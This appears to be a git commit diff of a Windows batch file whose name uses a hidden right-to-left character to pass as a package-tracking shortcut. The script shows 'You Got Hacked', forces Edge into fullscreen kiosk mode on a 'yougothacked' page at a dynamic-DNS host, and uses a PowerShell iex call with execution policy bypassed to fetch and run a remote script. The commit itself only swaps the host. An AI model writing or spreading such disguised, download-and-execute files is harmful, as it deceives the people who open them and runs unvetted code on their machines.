c931b1adb5eca40b0ab08ac875e5fe0a23445029
bestCoder1877 <datoohamza@outlook.com>
2026-02-13 16:41:39 -0500

    Modify script to change URL
    Updated the URL in the script.

--- track_package_open_‮tuctrohs.bat
+++ track_package_open_‮tuctrohs.bat
@@ -1,5 +1,6 @@
 @echo off
 echo You Got Hacked
-"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --kiosk https://files.bestcoder1877.ddnsfree.com/yougothacked.html --edge-kiosk-type=fullscreen
+"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --kiosk https://files.bestcoder1877.qzz.io/yougothacked.html --edge-kiosk-type=fullscreen
 powershell -NoProfile -ExecutionPolicy Bypass -Command "iex (Invoke-RestMethod 'https://raw.githubusercontent.com/avdaredevil/matrix/master/Matrix.ps1')"
+
 pause
